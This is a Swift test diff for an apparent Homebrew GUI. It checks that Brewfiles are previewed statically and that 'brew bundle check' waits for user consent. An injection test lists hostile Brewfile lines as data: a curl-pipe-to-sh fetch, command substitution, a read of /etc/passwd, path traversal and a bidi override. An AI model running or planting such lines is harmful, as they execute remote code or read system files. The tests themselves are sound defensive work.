@@ -70,3 +70,128 @@ struct V088TestHooksTests {
         #expect(BrewInstallation.locate(override: "/bin/ls")?.brewPath == "/bin/ls")
     }
 }
+
+/// #2: Check Brewfile… reads plain lines without running the file, and
+/// runs brew bundle check only after the "it runs the file's code" question.
+@MainActor
+struct V088BrewfilePreviewTests {
+    @Test func readsOnlyPlainLiteralLines() {
+        let text = """
+        # dotfiles
+        tap "homebrew/bundle"
+        tap "acme/tools", "https://git.acme.internal/tools.git"
+        brew "jq"
+        brew 'git'
+        brew("ripgrep")
+        brew "postgresql@18", restart_service: :changed, link: false
+        brew "vim", args: ["with-lua", "HEAD"]   # editor
+        cask "firefox"
+        cask "acme/tools/widget"
+        mas "Xcode", id: 497799835
+        vscode "golang.go"
+
+        """
+        let p = BrewfileStaticReader.preview(path: "/x/Brewfile", text: text, quarantined: false)
+        #expect(p.notRead.isEmpty)
+        #expect(p.names(.tap) == ["homebrew/bundle", "acme/tools"])
+        #expect(p.names(.formula) == ["jq", "git", "ripgrep", "postgresql@18", "vim"])
+        #expect(p.names(.cask) == ["firefox", "acme/tools/widget"])
+        #expect(p.names(.mas) == ["Xcode"])
+        #expect(p.names(.vscode) == ["golang.go"])
+    }
+
+    @Test func injectionLinesAreShownAsNotReadNeverRun() {
+        let lines = [
+            #"system "curl https://example.com/x | sh""#,
+            #"brew "jq"; system("touch /tmp/pwned")"#,
+            ##"brew "#{`id`}""##,
+            #"brew "a\"; system(\"x\")""#,
+            "brew `whoami`",
+            #"brew ENV["PKG"]"#,
+            #"brew "jq" if system("x")"#,
+            #"brew "jq", args: [`id`]"#,
+            ##"brew "jq", args: ["#{x}"]"##,
+            #"brew "jq", link: File.read("/etc/passwd")"#,
+            #"brew "--force""#,
+            #"brew "-v""#,
+            #"cask "../../evil""#,
+            #"tap "evil/tap", "https://x/y.git", eval("x")"#,
+            #"mas "App", id: open("x")"#,
+            #"mas "App""#,
+            "%x(id)",
+            "require 'open3'",
+            #"["jq"].each { |f| brew f }"#,
+            #"brew("jq"))"#,
+            "brew\u{202E}\"jq\"",
+        ]
+        let p = BrewfileStaticReader.preview(path: "/x/Brewfile", text: lines.joined(separator: "\n"), quarantined: true)
+        #expect(p.entries.isEmpty)
+        #expect(p.notRead.map(\.number) == Array(1...lines.count))
+        #expect(p.quarantined)
+        // Shown as text, without control or bidi characters.
+        #expect(p.notRead.last?.text.unicodeScalars.contains("\u{202E}") == false)
+    }
+
+    @Test func longUnreadLinesAreCut() {
+        let p = BrewfileStaticReader.preview(path: "/b", text: "x = \"" + String(repeating: "a", count: 500) + "\"", quarantined: false)
+        #expect(p.notRead.first?.text.count == 160)
+        #expect(p.notRead.first?.text.hasSuffix("…") == true)
+    }
+
+    @Test func previewRunsNothingAndCheckWaitsForConsent() async throws {
+        let log = CallLog()
+        let brewfile = BrewfileStore()
+        brewfile.run = { args in log.add(args); return ProcessResult(exitCode: 0, stdout: Data(), stderr: Data()) }
+        brewfile.readFile = { _ in "brew \"jq\"\nsystem \"curl x | sh\"\n" }
+        brewfile.quarantined = { _ in true }
+        brewfile.preview(path: "/Users/me/Downloads/Brewfile")
+        guard case .preview(let p) = brewfile.page else { Issue.record("no preview"); return }
+        #expect(p.names(.formula) == ["jq"])
+        #expect(p.notRead.map(\.number) == [2])
+        brewfile.requestBrewCheck()
+        #expect(brewfile.page == .confirmRun(p))
+        brewfile.cancelBrewCheck()
+        #expect(brewfile.page == .preview(p))
+        await brewfile.waitForIdle()
+        #expect(log.calls.isEmpty)
+        // The question is louder for a downloaded file.
+        let loud = BrewfileStore.runWarning(quarantined: true)
+        #expect(loud.count == 3)
+        #expect(loud[0].contains("downloaded"))
+        #expect(BrewfileStore.runWarning(quarantined: false).first?.contains("Ruby program") == true)
+    }
+
+    @Test func confirmRunsBrewBundleCheck() async throws {
+        var deps = Demo.dependencies(.arm64, pace: 0)
+        deps.readBrewfile = { _ in "tap \"hashicorp/tap\"\n" }
+        let store = AppStore(deps: deps)
+        await store.start()
+        store.previewBrewfile(at: "/Users/you/Desktop/Brewfile")
+        guard case .preview = store.brewfile.page else { Issue.record("no preview"); return }
+        store.confirmBrewfileCheck() // not asked yet: nothing
+        guard case .preview = store.brewfile.page else { Issue.record("ran without the question"); return }
+        store.brewfile.requestBrewCheck()
+        store.confirmBrewfileCheck()
+        await store.brewfile.waitForIdle()
+        guard case .checked = store.brewfile.page else { Issue.record("no check result: \(store.brewfile.page)"); return }
+    }
+
+    @Test func tooLargeOrUnreadableFileIsNotPreviewed() {
+        let brewfile = BrewfileStore()
+        brewfile.readFile = { _ in nil }
+        brewfile.preview(path: "/nonexistent/Brewfile")
+        guard case .failed = brewfile.page else { Issue.record("expected failed"); return }
+    }
+
+    @Test func quarantineMarkIsRead() throws {
+        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("tankard-q-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: dir) }
+        let f = dir.appendingPathComponent("Brewfile")
+        try Data("brew \"jq\"\n".utf8).write(to: f)
+        #expect(!BrewfileStaticReader.isQuarantined(f.path))
+        let value = "0081;00000000;Safari;"
+        #expect(setxattr(f.path, "com.apple.quarantine", value, value.utf8.count, 0, 0) == 0)
+        #expect(BrewfileStaticReader.isQuarantined(f.path))
+    }
+}
